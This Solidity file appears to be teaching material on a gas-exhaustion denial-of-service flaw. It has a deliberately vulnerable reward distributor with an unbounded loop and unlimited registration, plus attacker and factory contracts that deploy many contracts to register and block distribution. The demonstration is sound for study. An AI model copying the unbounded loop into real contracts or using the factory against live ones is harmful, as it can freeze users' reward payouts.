// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title VulnerableRewardDistributor
 * @notice This contract demonstrates a DoS vulnerability.
 * The contract allows users to register and then distributes rewards to all registered users.
 * An attacker can register many addresses to make the distributeRewards function run out of gas.
 */
contract VulnerableRewardDistributor {
    ERC20 public rewardToken;
    address[] public registeredUsers;
    mapping(address => bool) public isRegistered;
    mapping(address => bool) public hasReceivedReward;
    uint256 public rewardAmount = 1 ether; // 1 token per user

    event UserRegistered(address indexed user);
    event RewardDistributed(address indexed user, uint256 amount);

    constructor(address _rewardToken) {
        rewardToken = ERC20(_rewardToken);
    }

    /**
     * @notice Register a user to be eligible for rewards
     * @dev Vulnerable: No limit on number of registrations
     */
    function register() external {
        require(!isRegistered[msg.sender], "Already registered");
        registeredUsers.push(msg.sender);
        isRegistered[msg.sender] = true;
        emit UserRegistered(msg.sender);
    }

    /**
     * @notice Distribute rewards to all registered users
     * @dev VULNERABLE: This function iterates over all registered users.
     *      An attacker can register many addresses to cause this function to run out of gas.
     */
    function distributeRewards() external {
        require(rewardToken.balanceOf(address(this)) >= registeredUsers.length * rewardAmount, "Insufficient balance");
        
        // VULNERABILITY: Unbounded loop - can be DoS'd by registering many addresses
        for (uint256 i = 0; i < registeredUsers.length; i++) {
            address user = registeredUsers[i];
            if (!hasReceivedReward[user]) {
                hasReceivedReward[user] = true;
                rewardToken.transfer(user, rewardAmount);
                emit RewardDistributed(user, rewardAmount);
            }
        }
    }

    /**
     * @notice Get the number of registered users
     */
    function getRegisteredUsersCount() external view returns (uint256) {
        return registeredUsers.length;
    }

    /**
     * @notice Deposit tokens to be distributed as rewards
     */
    function depositRewards(uint256 amount) external {
        rewardToken.transferFrom(msg.sender, address(this), amount);
    }
}

/**
 * @title DoSAttacker
 * @notice This contract demonstrates how to exploit the DoS vulnerability
 */
contract DoSAttacker {
    VulnerableRewardDistributor public target;
    address public owner;

    constructor(address _target) {
        target = VulnerableRewardDistributor(_target);
        owner = msg.sender;
    }

    /**
     * @notice Attack by registering multiple addresses
     * @param count Number of addresses to register
     */
    function attack(uint256 count) external {
        require(msg.sender == owner, "Only owner");
        
        // Register this contract multiple times (if allowed) or create multiple contracts
        // In this example, we'll register the same contract multiple times
        // In a real attack, an attacker would create many contracts
        for (uint256 i = 0; i < count; i++) {
            // Note: This will fail after first registration due to require in register()
            // In a real attack, the attacker would deploy many separate contracts
            try target.register() {
                // Success
            } catch {
                // Already registered or other error
            }
        }
    }

    /**
     * @notice Register this contract
     */
    function register() external {
        target.register();
    }
}

/**
 * @title DoSAttackerFactory
 * @notice Factory contract to create many attacker contracts
 */
contract DoSAttackerFactory {
    VulnerableRewardDistributor public target;
    DoSAttacker[] public attackers;

    constructor(address _target) {
        target = VulnerableRewardDistributor(_target);
    }

    /**
     * @notice Create multiple attacker contracts and register them
     * @param count Number of attacker contracts to create
     */
    function createAttackers(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            DoSAttacker attacker = new DoSAttacker(address(target));
            attackers.push(attacker);
            attacker.register();
        }
    }

    /**
     * @notice Get the number of attacker contracts created
     */
    function getAttackersCount() external view returns (uint256) {
        return attackers.length;
    }
}
